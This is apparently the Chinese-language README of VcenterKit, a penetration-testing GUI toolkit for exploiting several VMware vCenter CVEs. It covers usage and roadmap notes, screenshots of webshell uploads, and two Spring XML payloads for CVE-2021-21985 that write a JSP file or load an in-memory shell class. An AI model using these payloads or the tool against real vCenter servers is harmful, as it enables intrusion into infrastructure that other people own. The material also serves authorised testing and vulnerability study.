![VcenterKit](https://socialify.git.ci/W01fh4cker/VcenterKit/image?description=1&descriptionEditable=Vcenter%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E5%8C%85%20%7C%20Vcenter%20Comprehensive%20Penetration%20and%20Exploitation%20Toolkit&font=Rokkitt&forks=1&issues=1&language=1&logo=https%3A%2F%2Fs2.loli.net%2F2022%2F06%2F25%2FgUAh2V5CiD96y8G.jpg&owner=1&pattern=Circuit%20Board&pulls=1&stargazers=1)

# 1. 使用说明

## 1.1 安装与启动

推荐使用`Python3.9`，其余版本未测试。

```shell
pip install -r requirements.txt
python VcenterKit.py
```

## 1.2 信息收集模块

直接输入`url`即可进行信息搜集，如果存在本地文件读取的话，程序会自动读取数据库文件；有些网站是没有`sdk`接口的，也就无法通过这种方式来查询信息，后续会研究其他的方法：

![](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20230824001431.png)

## 1.3 CVE-2021-21972模块

主要利用思维导图如下：

可以看到，并非所有情况下都能`100%`成功上传文件的，因此这里我把这些利用链（除了写`authorized_keys`）全部写在代码里面了，依次尝试。

![](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/9f185d40dfc9057818ed93226aeb279.png)

这里放上之前测试利用搭建的环境的截图：

![](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/8bd245ffada0baa39a3059c73764bed.jpg)

上传哥斯拉马：

![11edd12a79387cb0d58d2a24b86ca10](https://github.com/W01fh4cker/VcenterKit/assets/101872898/3aac0b58-d2b7-49bd-a51e-5dc87e4f8845)


## 1.4 CVE-2021-21985模块

![image](https://github.com/W01fh4cker/VcenterKit/assets/101872898/e49cb0bb-0bbf-457b-b789-09ce3948a220)


需要注意的是，这里的`RMI`和`Command`只能二选一填写，目前`rmi`由于测试环境的问题，还没有进行测试，可能会有问题，但是`command`目前测试下来没什么问题，这里放上一张之前写的时候测试的截图：

![](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/e39abf9b303b95372fa666e919cf705.png)

需要注意的是，当前版本（`v0.0.1`）的`shell`上传和内存马打入模块还没实现。但是核心思想就是替换`xml`：

>  以下参考：https://daidaitiehanhan.github.io/2022/04/18/vCenter2021几个漏洞及后渗透/#不出网利用

上传`shell`的`xml`：

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.io.PrintWriter">
        <constructor-arg>
            <value>/usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/41/0/h5ngc.war/resources/log2.jsp</value>
        </constructor-arg>
    </bean>
    <bean id="is" class="java.lang.String">
        <constructor-arg>
            <value><![CDATA[<% out.println("ok"); %> ]]></value>
        </constructor-arg>
        <property name="whatever" value="#{ pb.println(is).close()}"/>
    </bean>
</beans>
```

打内存马要用到的`xml`：

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="com.sun.org.apache.bcel.internal.util.ClassLoader">
    </bean>
        <bean id="is" class="java.lang.String">
        <constructor-arg>
            <value><![CDATA[$$BCEL$$...]]></value>
        </constructor-arg>
        <property name="whatever" value="#{ pb.loadClass(is).newInstance()}"/>
    </bean>
</beans>
```

等后面有时间了写上，当然，你可以来写，然后提`pr`，我看到会第一时间回复。

## 1.5 CVE-2021-22005模块

这里的`shell name`可写可不写，不写的话就是自动生成`6`位的名字。

![](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20230824003746.png)

测试截图：
![](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20230824003704.png)

## 1.6 CVE-2022-22954（下个版本更新）

预览图如下：

![](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20230824003914.png)

## 1.7 CVE-2022-22972（下个版本更新）

预览：

![](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20230824004009.png)

## 1.8 后渗透利用模块（下个版本更新）

本来是想把这些脚本集成到工具里面的，但是转念一想，没必要，直接弄成点按钮生成脚本到本地这种形式就可以了，这样直接一个工具走天下。

![](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20230824004100.png)

## 1.9 渗透测试记事本

后面会放一些打vcenter的时候常用的命令、常看的文章上去

![](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20230824004255.png)

# 2. Q&A

## 2.1 代理问题？

因为`vcenter`大多数位于内网，因此都是`proxifer`挂代理打，也就不怎么需要程序本身加个代理功能，我也懒得写了。

## 2.2 长期维护吗？

长期维护！本工具会和未来出的一系列工具，例如后面会开始写的`ExchangeKit`一样，都是我长期维护的项目，和之前的`Serein`(https://github.com/W01fh4cker/Serein)不一样（那个时候代码水平不行，加上`tkinter`做图形化太难受了，就不想维护了）。

## 2.3 代码写的有逻辑问题/有bug/有新利用方式，如何沟通？

类似的问题，直接提交`issues`(https://github.com/W01fh4cker/VcenterKit/issues)，描述清楚相关环境，和具体细节，我看到之后会在当天内回复，一般20分钟内就会回复（因为我的电子邮件可以实时收到消息）。

如果有代码能力的话，欢迎提交`pull request`。

## 2.4 想参与进来，共同维护？

没问题，提交`pull request`，贡献代码。

## 2.5 和其他工具相比的优缺点？

`Akatsuki`师傅（https://github.com/Schira4396）写的`VcenterKiller`是我非常喜欢的一个利用工具，我的`VcenterKit`与其定位并不相同，我这个是用于本地挂代理测试内网或者外网的`vcenter`漏洞，并且由于方便而弄了个`pyqt5`做图形化，这直接导致打包后的`exe`体积非常非常大；而`VcenterKiller`则是用`go`语言写的一款小巧的利用工具，可以直接传至对方服务器运行，也可以本地运行，可以跨平台，非常的方便。

对于`CVE-2021-21972`这个漏洞而言，本工具可以自定义`shell`的名字，并且自动尝试数种利用链，用起来还是很舒服的，哈哈。

工具只是辅助，写工具的过程是了解漏洞的很好的方式，从中获得经验，足矣。

# 3. TODO

* [ ] 完成未完成的几个模块的功能编写
* [ ] 研究`CVE-2021-21985`的上传`shell`和打内存马的方式
* [ ] 你们提建议

# 4. 微信公众号：追梦信安

![](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20230824010900.png)
